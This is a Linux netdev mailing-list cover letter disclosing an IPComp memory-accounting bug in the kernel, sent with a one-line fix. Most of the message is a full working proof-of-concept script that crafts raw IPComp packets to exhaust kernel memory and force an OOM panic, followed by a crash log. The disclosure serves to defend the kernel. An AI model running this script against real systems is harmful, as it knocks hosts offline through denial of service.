Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.215.171
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792693952;
	b=0Pdbfph6z4K6RGnxrUKJfDeUfZce35E6n/Eu+H2gpTtjEn+J/w3DcV7Ct4JFbgoUGtw9
	 vTX6fyLCa9UUTZuQFK0dGYjPQGeRcMJv3qV4SQ1+Ls4Xmo1HyNcUZCIZGAJx0lkkoEi34
	 36cnHdKyrAd9Jpp1jASc5VGt/SJzNFocXQAOg3qR7VTrQEja2TYLKgENVj33JXIIoJ6Hk
	 XtrH298iFbZjDXnUew+PxTm3As3sALtqRTgtB6ziKDnpCc2NZ1acYMjXl+sXuTDBWo06u
	 uGk9DQxxB4DVg6O4x9DKh6FTfE2KzLJmBcfqY5o+LJYDYKK4EN3Wf153ZHP0mq1pt2Q==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792693952;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=uc34EfQLFnMLXI+sab0XHpvcFB9x+DYwujfJ/kQMueI=;
	b=s/hahFqUMvZIekNgueIYzP4+dmQIVUAR7t4ypcEZzqM+vLDV/J7R/VPIdgJazZV4tHbO
	 CyYMbc4pF08hDWXwwDLYw7qu2OmSmyFBA8/bkYdLj0iaU7i0Ly5Gkwjryxw4wXg1ZbLQ1
	 RPYnu0zt53zjqwVLMxoLgP9Uhuk5gA9lnLi1XBvjOcmu7dHdScVRDR9RdwDLkao865bRK
	 KjaJf5xvFHocmti0U0sWuLZ1m7MYmqTPXmB2gXM4SHattoPvvSCs6Eg/IrgjYp4ROQyWG
	 nwh5qspFvGF6BKPV2F3cB+rIlP2x3rTr9pzTzpfS39RsDnXRgaX7ZKLpNofZ8Yjgi7A==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=n4zKXBCY;
	arc=none smtp.remote-ip=209.85.215.171
Received: from mail-pg1-f171.google.com (mail-pg1-f171.google.com [209.85.215.171])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 20962606B7FB
	for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 18:32:31 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 20962606B7FB
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=n4zKXBCY
Received: by mail-pg1-f171.google.com with SMTP id 41be03b00d2f7-cd62c570b5dso77179a12.2
        for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 11:32:31 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792693951; x=1793298751; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=uc34EfQLFnMLXI+sab0XHpvcFB9x+DYwujfJ/kQMueI=;
        b=n4zKXBCYkm+ly/wivj+1W4Jf3te+BMTPe/nHK8LzNbCqQlZhgn1ucFMSa2loEtJJNI
         aj4wP3PWoJOUn9wJ9IAR4IzP7uE85IXtJHV6X3AOYKuwDfyVlIqCYr28wimKmUiFE+v8
         mBG9hoLPaHrOTjsCwPsmG+cP23TsmXkjXRwqsdC4rWKX5NMezJPt4pVcoLoAQTgWauYN
         wbmpvBF7wX+texDR8A3MfITC43MubGzIaXupayfQYRfjqFu4fdnERgd0aWMHEmKGoLSw
         Apd40E4SXX3NRB9C72Qxe409ZbV8SkffiPoknVWdXJof3XVg2uRpLn73cToT7kVnzlk3
         fwZw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792693951; x=1793298751;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=uc34EfQLFnMLXI+sab0XHpvcFB9x+DYwujfJ/kQMueI=;
        b=Zif9hhe1W3nyqk899VjIVI91bM5eStij32e8qUcvFU/9S5dd4IHEDpTcGSCvBdGPak
         cxqyHhycvzmYG9tJDSNqMf+gzXsgpuhCEaRYvgOMmhRXpUMevsT5iSGci5WlktLrzBET
         zBwsFn/Es6OQ/F2kn4GdEkz2uGEsEd6BSxUCoJXf5nknQzbhZCWQfA6qj/oaMkWEvvFr
         UcIV/LXkqMAddBs+CnUl6vbVY8azFsXG+cVQXG+2JEvoFdOtgFsfCsVYWql6UA+kp8Nb
         DJtevilT/8ypbUjjeAfUk8mmzbhvDs/5qa+1J7xVu7F98zBYf3QjCD+pO3B7Ov2gwHF7
         M42w==
X-Gm-Message-State: AFq9FYKjuRbKKJAvkVM3n2EQyg9BN6wVA46ZMrz/xsxsG61A5O6DkweA
	Gkn9KARkQh9ZEZ4BdE9Ygk64HNAZhIyisbdq+kN3h9oOeShjGI3JHyjEDhX9amrTGihkb4ZevY7
	ua2XuHg==
X-Gm-Gg: AYBFou0MDJPgEtby120rLpTSgRkQkx+sid57PxEeDx7ZmX0aPWAqxSFS5qfEhCQWRDs
	T8tY4AHEj4pD3s9CSVw6uQU6nsAqRsH1MFCuumRSCjXwz5dkPGF2ekyhS1o8IWJirJmJYuREz/W
	iSZJtL4Ao5u4p5baRvbTHsiuxTRQZBQ81WfGfSI2OEYU5n8+WRfXw41CPrcNVCc0zPngwCaAKjc
	srZj8tv8GikoWODziX0T9+fZSgaYCZ9Qa7cAuecyn13B9paBa4koJbzs1pa1qOCWNa8Ilq3iVIp
	waHLyz1u1MpXIm07sJCDhbQ/lMGXZy6ZHhhZdJK/14ytHleL4/VFXnZeKcjkS59DTweMzwxbnJu
	QPjNt+4y3flptlx+Pou1TR+VvpthyIP56SW5IqOA45Vs0gIeDaOnFrjMjryaGRjx6CRy5RVDSUs
	vhGcvxo6ZzHcdoHK8kcBFoyQAEYMpUURdY8gPMs2/LmqPcbvsXUU/a3qQV1bKRzXFQ5k/AAcYV7
	k4X+ATlmQJMlWjS90A437s6RwiPTreGE4+c6Zy4+2mt0g1KBTQB+BAso5os1B7zwrAy
X-Received: by 2002:a17:90b:1e46:b0:3ab:b39f:41b9 with SMTP id 98e67ed59e1d1-3ad8708ad9dmr4787863a91.61.1792693951112;
        Thu, 22 Oct 2026 11:32:31 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2001:49f0:d0db:ffab:2834:5ac2:f726:a005])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ada49314besm5275608a91.11.2026.10.22.11.32.26
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 22 Oct 2026 11:32:30 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org
Cc: steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] xfrm: ipcomp: account full fragment pages in truesize
Date: Fri, 23 Oct 2026 02:32:16 +0800
Message-ID: <cover.1792692779.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/xfrm/xfrm_ipcomp.c. The bug is
reachable by a non-root user via user and network namespaces.

This bug is tracked at: https://bugtracker.nebusec.ai/f/13830

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ipcomp_post_acomp() attaches freshly allocated order-0 pages to the
reassembled skb but, on input, increases skb->truesize only by the
decompressed byte count. When the output ends partway through the final
page, the unused tail of that page remains allocated but is absent from
the socket receive-memory charge. Repeated IPComp packets queued to
sockets can therefore retain more kernel memory than the configured
receive-memory limits account for.

Round the input truesize charge up to the page size, matching the pages
attached to the skb. Output-side accounting remains unchanged.

Reproducer:

    unshare -Urn ./poc.sh observe
    NSOCK=100 NPKT=6 ./poc.sh crash

The observe mode sends a raw IPComp packet through an inbound XFRM state.
The crash mode sets vm.panic_on_oom=2 and sends compressed payloads to UDP
sockets to exercise the memory-accounting discrepancy. The script
requires iproute2, Python 3, XFRM/IPComp, and the deflate crypto
implementation. We run the PoC in a 2 vCPU, 512 MB RAM x86 QEMU
environment.

------BEGIN poc.sh------

    #!/bin/bash
    set -euo pipefail

    MODE="${1:-observe}"
    NSOCK="${NSOCK:-100}"
    NPKT="${NPKT:-6}"
    PAYLOAD_LEN="${PAYLOAD_LEN:-53585}"
    BASE_PORT="${BASE_PORT:-20000}"
    SRC_IP="${SRC_IP:-10.0.1.1}"
    DST_IP="${DST_IP:-10.0.1.2}"
    VETH_A="${VETH_A:-ipcomp0}"
    VETH_B="${VETH_B:-ipcomp1}"
    STATE_SPI="${STATE_SPI:-0x100}"

    cleanup() {
    	ip link del "$VETH_A" 2>/dev/null || true
    	rm -f /tmp/ipcomp_recv.log /tmp/ipcomp_sender.py
    }
    trap cleanup EXIT

    setup_net() {
    	ip link del "$VETH_A" 2>/dev/null || true
    	ip link add "$VETH_A" type veth peer name "$VETH_B"
    	ip addr add "$SRC_IP/24" dev "$VETH_A"
    	ip addr add "$DST_IP/24" dev "$VETH_B"
    	ip link set lo up
    	ip link set "$VETH_A" up
    	ip link set "$VETH_B" up

    	ip xfrm state add src "$SRC_IP" dst "$DST_IP" proto comp spi "$STATE_SPI" mode transport comp deflate
    	ip xfrm policy add dir in src "$SRC_IP/32" dst "$DST_IP/32" \
    		tmpl src "$SRC_IP" dst "$DST_IP" proto comp mode transport
    }

    write_sender() {
    	cat >/tmp/ipcomp_sender.py <<'PY'
    import os
    import socket
    import struct
    import time
    import zlib

    SRC = os.environ["SRC_IP"]
    DST = os.environ["DST_IP"]
    BASE_PORT = int(os.environ["BASE_PORT"])
    NSOCK = int(os.environ["NSOCK"])
    NPKT = int(os.environ["NPKT"])
    PAYLOAD_LEN = int(os.environ["PAYLOAD_LEN"])
    SPI = int(os.environ["STATE_SPI"], 0)
    SPORT = 12345
    PAYLOAD = b"Z" * PAYLOAD_LEN


    def checksum(data):
        if len(data) & 1:
            data += b"\0"
        words = struct.unpack("!%dH" % (len(data) // 2), data)
        total = sum(words)
        while total >> 16:
            total = (total & 0xFFFF) + (total >> 16)
        return (~total) & 0xFFFF


    def build_packet(dport):
        udp_len = 8 + len(PAYLOAD)
        udp = struct.pack("!HHHH", SPORT, dport, udp_len, 0) + PAYLOAD
        comp = zlib.compressobj(level=9, wbits=-zlib.MAX_WBITS)
        compressed = comp.compress(udp) + comp.flush()
        ipcomp = struct.pack("!BBH", socket.IPPROTO_UDP, 0, SPI) + compressed

        total_len = 20 + len(ipcomp)
        iphdr = struct.pack(
            "!BBHHHBBH4s4s",
            0x45,
            0,
            total_len,
            dport & 0xFFFF,
            0,
            64,
            108,
            0,
            socket.inet_aton(SRC),
            socket.inet_aton(DST),
        )
        iphdr = iphdr[:10] + struct.pack("!H", checksum(iphdr)) + iphdr[12:]
        return iphdr + ipcomp


    if os.environ.get("ROLE") == "recv":
        sockets = []
        for i in range(NSOCK):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
            s.bind((DST, BASE_PORT + i))
            sockets.append(s)
        print(f"ready sockets={len(sockets)}", flush=True)
        if NSOCK == 1 and NPKT == 1:
            data, addr = sockets[0].recvfrom(70000)
            print(f"received len={len(data)} from={addr[0]}:{addr[1]}", flush=True)
        else:
            time.sleep(600)
    else:
        pkts = [build_packet(BASE_PORT + i) for i in range(NSOCK)]
        rs = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        rs.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sent = 0
        for _ in range(NPKT):
            for pkt in pkts:
                rs.sendto(pkt, (DST, 0))
                sent += 1
        print(f"sent packets={sent}", flush=True)
    PY
    }

    observe_once() {
    	python3 - <<'PY'
    import os
    import subprocess
    import tempfile

    trace = r"""
    kprobe:ipcomp_input
    {
      @skb[tid] = arg1;
      @ts[tid] = ((struct sk_buff *)arg1)->truesize;
      @pages[tid] = 0;
    }

    kprobe:__alloc_pages_noprof /@skb[tid]/
    {
      @pages[tid] = @pages[tid] + 1;
    }

    kretprobe:ipcomp_input /@skb[tid]/
    {
      $skb = (struct sk_buff *)@skb[tid];
      $delta = $skb->truesize - @ts[tid];
      printf("pages=%d delta=%d under=%d final_len=%d data_len=%d\n",
             @pages[tid], $delta, (@pages[tid] * 4096) - $delta,
             $skb->len, $skb->data_len);
      delete(@skb[tid]);
      delete(@ts[tid]);
      delete(@pages[tid]);
    }
    """
    with tempfile.NamedTemporaryFile("w", delete=False) as f:
        f.write(trace)
        path = f.name
    proc = subprocess.Popen(["bpftrace", path], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    print(proc.pid)
    PY
    }

    do_observe() {
    	export NSOCK=1 NPKT=1
    	setup_net
    	write_sender

    	if command -v bpftrace >/dev/null 2>&1; then
    		BTPID="$(observe_once | tail -n1)"
    		sleep 2
    	fi

    	env ROLE=recv NSOCK=1 NPKT=1 SRC_IP="$SRC_IP" DST_IP="$DST_IP" BASE_PORT="$BASE_PORT" \
    		PAYLOAD_LEN="$PAYLOAD_LEN" STATE_SPI="$STATE_SPI" python3 /tmp/ipcomp_sender.py >/tmp/ipcomp_recv.log 2>&1 &
    	RECV_PID=$!
    	sleep 1
    	env SRC_IP="$SRC_IP" DST_IP="$DST_IP" BASE_PORT="$BASE_PORT" NSOCK=1 NPKT=1 \
    		PAYLOAD_LEN="$PAYLOAD_LEN" STATE_SPI="$STATE_SPI" python3 /tmp/ipcomp_sender.py
    	wait "$RECV_PID"
    	cat /tmp/ipcomp_recv.log

    	if [ -n "${BTPID:-}" ]; then
    		sleep 2
    		kill "$BTPID" 2>/dev/null || true
    	fi
    }

    do_crash() {
    	if [ "$(id -u)" -ne 0 ]; then
    		echo "crash mode needs real root to set global panic sysctls" >&2
    		exit 1
    	fi

    	echo 0 >/proc/sys/kernel/panic_on_warn
    	echo 2 >/proc/sys/vm/panic_on_oom

    	setup_net
    	write_sender

    	env ROLE=recv NSOCK="$NSOCK" NPKT="$NPKT" SRC_IP="$SRC_IP" DST_IP="$DST_IP" BASE_PORT="$BASE_PORT" \
    		PAYLOAD_LEN="$PAYLOAD_LEN" STATE_SPI="$STATE_SPI" python3 /tmp/ipcomp_sender.py >/tmp/ipcomp_recv.log 2>&1 &
    	sleep 2
    	cat /tmp/ipcomp_recv.log
    	env SRC_IP="$SRC_IP" DST_IP="$DST_IP" BASE_PORT="$BASE_PORT" NSOCK="$NSOCK" NPKT="$NPKT" \
    		PAYLOAD_LEN="$PAYLOAD_LEN" STATE_SPI="$STATE_SPI" python3 /tmp/ipcomp_sender.py
    }

    case "$MODE" in
    observe)
    	do_observe
    	;;
    crash)
    	do_crash
    	;;
    *)
    	echo "usage: $0 [observe|crash]" >&2
    	exit 1
    	;;
    esac

------END poc.sh--------

----BEGIN crash log----

[  122.352180] python3: page allocation failure: order:0, mode:0x820(GFP_ATOMIC), nodemask=(null),cpuset=/,mems_allowed=0
[  122.353453] CPU: 0 UID: 0 PID: 926 Comm: python3 Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  122.353462] Call Trace:
[  122.353471]  <IRQ>
[  122.353501]  warn_alloc+0x24b/0x390
[  122.353597]  __alloc_pages_slowpath.constprop.0+0x15d8/0x2800
[  122.353711]  __alloc_pages_noprof+0x54b/0x760
[  122.353752]  alloc_pages_mpol_noprof+0x1b1/0x430
[  122.353827]  ipcomp_input+0x4d6/0xc80
[  122.353869]  xfrm_input+0x254f/0x6f50
[  122.353946]  xfrm4_ipcomp_rcv+0x7f/0xe0
[  122.353958]  ip_protocol_deliver_rcu+0x280/0x310
[  122.353975]  ip_local_deliver_finish+0x2c7/0x3d0
[  122.353984]  ip_local_deliver+0x2a7/0x300
[  122.354038]  ip_rcv+0x393/0x440
[  122.354129]  __netif_receive_skb_one_core+0x168/0x1b0
[  122.354171]  process_backlog+0x33c/0xf00
[  122.354199]  net_rx_action+0x4d4/0xc70
[  122.354285]  handle_softirqs+0x282/0x7d0
[  122.354323]  __local_bh_enable_ip+0x79/0x80
[  122.354326]  __dev_queue_xmit+0xc0a/0x31d0
[  122.354497]  ip_finish_output2+0x9b1/0x19f0
[  122.354535]  ip_output+0x1b1/0x430
[  122.354580]  raw_sendmsg+0x258b/0x2c50
[  122.354735]  __sys_sendto+0x361/0x3f0
[  122.354811]  __x64_sys_sendto+0xe0/0x1c0
[  122.354826]  do_syscall_64+0x6f/0x150
[  122.354839]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  122.354895]  </TASK>
[  123.097901] rasdaemon invoked oom-killer: gfp_mask=0x40cc0(GFP_KERNEL|__GFP_COMP), order=1, oom_score_adj=0
[  123.098667] CPU: 3 UID: 0 PID: 502 Comm: rasdaemon Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  123.098676] Call Trace:
[  123.098680]  <TASK>
[  123.098694]  dump_header+0xf5/0x650
[  123.098720]  out_of_memory+0x737/0x1360
[  123.098779]  __alloc_pages_slowpath.constprop.0+0x1eb8/0x2800
[  123.098856]  __alloc_pages_noprof+0x54b/0x760
[  123.098921]  alloc_pages_mpol_noprof+0x1b1/0x430
[  123.098952]  allocate_slab+0x3ae/0x550
[  123.098965]  ___slab_alloc+0xdcb/0x1620
[  123.099019]  kmem_cache_alloc_noprof+0x2b9/0x3e0
[  123.099050]  user_path_at+0x21/0x50
[  123.099058]  do_faccessat+0x2c4/0x8c0
[  123.099108]  do_syscall_64+0x6f/0x150
[  123.099123]  entry_SYSCALL_64_after_hwframe+0x76/0x7e

# The serial console returned to a fresh boot (`[    0.000000] Linux version 6.12.95 ...`)
# immediately after the OOM-path output above. The guest had `vm.panic_on_oom=2` set.

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  xfrm: ipcomp: account full fragment pages in truesize

 net/xfrm/xfrm_ipcomp.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

